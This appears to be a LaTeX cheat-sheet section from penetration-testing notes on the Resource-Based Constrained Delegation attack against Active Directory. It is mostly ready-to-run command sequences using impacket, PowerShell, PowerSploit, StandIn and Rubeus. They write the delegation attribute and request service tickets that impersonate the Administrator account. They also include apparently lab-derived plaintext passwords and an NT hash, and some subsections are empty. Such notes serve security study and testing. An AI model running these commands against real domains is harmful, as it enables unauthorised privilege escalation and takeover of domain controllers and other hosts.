\section{Resource based constrained delegation attack}

\subsection{Introduction}
If an account, having the capability to edit the \verb+msDS-AllowedToActOnBehalfOfOtherIdentity+ attribute of another object ("GenericWrite","GenericAll","WriteProperty","WriteDacl"), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

The attacker needs to populate the target attribute with the SID of an account that Kerberos can consider as a service. A service ticket will be asked for it. In short, the account must be either:
\begin{itemize}
    \item a user account having a \verb+ServicePrincipalName+ set
    \item an Computer account (trailing  \verb+$+ in the \verb+sAMAccountName+)
    \item any other account and conduct SPN-less RBCD witth U2U (user-to-User) authentication
\end{itemize}


the common way is to create a computer account  (if \verb+MachineAccountQuota > 0+)


\subsection{From linux}

\subsubsection{Create a computer or compromise a SPN}

\subsubsection{edit msDS-AllowedToActOnBehalfOfOtherIdentity}

using \verb+impacket+:
\begin{verbatim}
# Read the attribute
rbcd.py -delegate-to 'target$' -dc-ip 'DomainController'\
    -action 'read' 'domain'/'PowerfulUser':'Password'

# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' \
    -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
\end{verbatim}

when conducting attack from a relayed auth, \verb+--delegate-access+ of ntlmrelayx can be used.

\subsubsection{Obtain a ticket}
\begin{verbatim}
getST.py -spn 'cifs/target' -impersonate Administrator \
    -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
\end{verbatim}

\subsubsection{Pass the ticket}


\subsection{On windows}
The attacker uses Rubeus to perform a full S4U attack (S4U2Self and S4U2Proxy) from Service A to Service B for a user with privileged access to Service B
\begin{enumerate}
    \item S4U2Self (from the SPN compromised/created account): Ask for
        a TGS of Administrator to me (Not Forwardable).
    \item S4U2Proxy: Use the not Forwardable TGS of the step before to
        ask for a TGS from Administrator to the victim host.
    \item Even if you are using a not Forwardable TGS, as you are
        exploiting Resource-based constrained delegation, it will
        work.
\end{enumerate}

\subsubsection{Create a computer or compromise a SPN}

\subsubsection{edit msDS-AllowedToActOnBehalfOfOtherIdentity}

with AD powershell module:
\begin{verbatim}
# Assing delegation privileges
Set-ADComputer (Get-Variable -Name "target").Value \
    -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKECOMPUTER$ 

# Check that it worked
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount 
\end{verbatim}

with Powersploit:
\begin{verbatim}
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
$ComputerSid = Get-DomainComputer "controlledaccountwithSPN" -Properties objectsid | 
    Select -Expand objectsid

# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor 
    -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
Get-DomainComputer "target$" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} 
# OR
$credentials = New-Object System.Management.Automation.PSCredential "INLANEFREIGHT\carole.holmes", (ConvertTo-SecureString "Y3t4n0th3rP4ssw0rd" -AsPlainText -Force)
PS C:\Tools> Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Credential $credentials -Verbose
\end{verbatim}

with \href{https://github.com/FuzzySecurity/StandIn}{StandIn}:
\begin{verbatim}
# Obtain the SID of the controlled account with SPN (e.g. Computer account)
StandIn.exe --object samaccountname=controlledaccountwithSPNName

# Add the object to the msDS-AllowedToActOnBehalfOfOtherIdentity of the targeted computer
StandIn.exe --computer "target" --sid "controlledaccountwithSPN's SID"
\end{verbatim}


\subsubsection{ Obtain a ticket}

Rubeus:
\begin{verbatim}
# obtain the hash of the created computer
.\Rubeus.exe hash /password:Hackthebox123+! /user:FAKECOMPUTER$ /domain:inlanefreight.local
Rubeus.exe hash /password:$password
Rubeus.exe hash /user:$username /domain:"domain.local" /password:$password

# Request a TGT for the current user
Rubeus.exe tgtdeleg /nowrap
# OR - Request a TGT for a specific account
Rubeus.exe asktgt /user:"controlledaccountwithSPN" /aes256:$aesKey /nowrap

# Request the "impersonation" service ticket using RC4 Key
.\Rubeus.exe s4u /user:HACKTHEBOX$ /rc4:CF767C9A9C529361F108AA67BF1B3695 /impersonateuser:administrator /msdsspn:cifs/dc01.inlanefreight.local /ptt

Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"cifs/target" /domain:"domain" /user:"controlledaccountwithSPN" /rc4:$NThash
# OR - Request the "impersonation" service ticket using TGT Ticket of the controlledaccountwithSPN
Rubeus.exe s4u /nowrap /impersonateuser:"administrator" /msdsspn:"host/target" /altservice:cifs,ldap,winrm, /domain:"domain" /user:"controlledaccountwithSPN" /ticket:$kirbiB64tgt
\end{verbatim}

\href{https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names}{Built-in SPNs Recognized for Computer Accounts}
\subsubsection{Pass the ticket}



\subsection{links}
\begin{itemize}
    \item 
        \href{https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd}{The Hacker Recipes}
    \item 
        \href{https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html}{Abusing
        Resource-Based Constrained Delegation to Attack Active Directory}
    \item 
        \href{https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/}{Resource-Based
        Constrained Delegation Abuse}
    \item
        \href{https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation}{Resource-based
        Constrained Delegation}
    \item
        \href{https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution}{Kerberos
        Resource-based Constrained Delegation: Computer Object Takeover}
    \item
        \href{https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-genericwrite-write-on-computer}{GenericAll / GenericWrite / Write on Computer}
\end{itemize}


